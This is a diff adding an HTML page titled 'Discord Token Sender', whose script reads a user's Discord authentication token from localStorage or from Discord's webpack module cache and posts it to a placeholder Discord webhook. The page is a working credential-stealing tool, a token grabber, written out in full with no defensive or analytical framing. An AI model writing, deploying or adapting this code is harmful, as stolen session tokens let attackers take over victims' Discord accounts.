@@ -1,1 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Token Sender</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 500px;
+        }
+        button {
+            background-color: #5865F2;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #4752C4;
+        }
+        .status {
+            margin-top: 20px;
+            color: #333;
+        }
+        .error {
+            color: #ED4245;
+        }
+        .success {
+            color: #3BA55D;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Discord Token Extractor</h2>
+        <p>Click the button below to extract your Discord token and send it to a webhook.</p>
+        <button id="extractBtn">Extract Discord Token</button>
+        <div id="status" class="status"></div>
+    </div>
 
+    <script>
+        document.getElementById('extractBtn').addEventListener('click', async function() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.textContent = 'Attempting to extract Discord token...';
+            statusDiv.className = 'status';
+            
+            try {
+                // Try to get token from localStorage
+                let token = localStorage.getItem('token');
+                
+                // If not in localStorage, try to get from document
+                if (!token) {
+                    const webpackJsonp = window.webpackJsonp;
+                    if (webpackJsonp) {
+                        for (const prop in webpackJsonp) {
+                            if (webpackJsonp[prop].exports) {
+                                for (const exportedProp in webpackJsonp[prop].exports) {
+                                    if (webpackJsonp[prop].exports[exportedProp].default) {
+                                        const user = webpackJsonp[prop].exports[exportedProp].default.getUser;
+                                        if (user) {
+                                            const userInfo = user();
+                                            if (userInfo && userInfo.authToken) {
+                                                token = userInfo.authToken;
+                                                break;
+                                            }
+                                        }
+                                    }
+                                }
+                                if (token) break;
+                            }
+                        }
+                    }
+                }
+                
+                // If still no token, try another method
+                if (!token) {
+                    const discordToken = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}),m).find(m=>m?.exports?.default?.getToken)?.exports.default.getToken());
+                    if (discordToken) {
+                        token = discordToken;
+                    }
+                }
+                
+                if (token) {
+                    statusDiv.textContent = 'Token found! Sending to webhook...';
+                    
+                    // Send to webhook
+                    const webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
+                    
+                    const data = {
+                        content: `Discord Token: ${token}`,
+                        embeds: [{
+                            title: 'Token Extracted',
+                            description: `A Discord token has been extracted from the browser.`,
+                            color: 5814783,
+                            fields: [
+                                {
+                                    name: 'Token',
+                                    value: `\`\`\`${token}\`\`\``,
+                                    inline: false
+                                }
+                            ]
+                        }]
+                    };
+                    
+                    const response = await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(data)
+                    });
+                    
+                    if (response.ok) {
+                        statusDiv.textContent = 'Token successfully sent to webhook!';
+                        statusDiv.className = 'status success';
+                    } else {
+                        statusDiv.textContent = 'Error sending token to webhook.';
+                        statusDiv.className = 'status error';
+                    }
+                } else {
+                    statusDiv.textContent = 'Could not find Discord token. Make sure you are logged into Discord in this browser.';
+                    statusDiv.className = 'status error';
+                }
+            } catch (error) {
+                statusDiv.textContent = `Error: ${error.message}`;
+                statusDiv.className = 'status error';
+            }
+        });
+    </script>
+</body>
+</html>
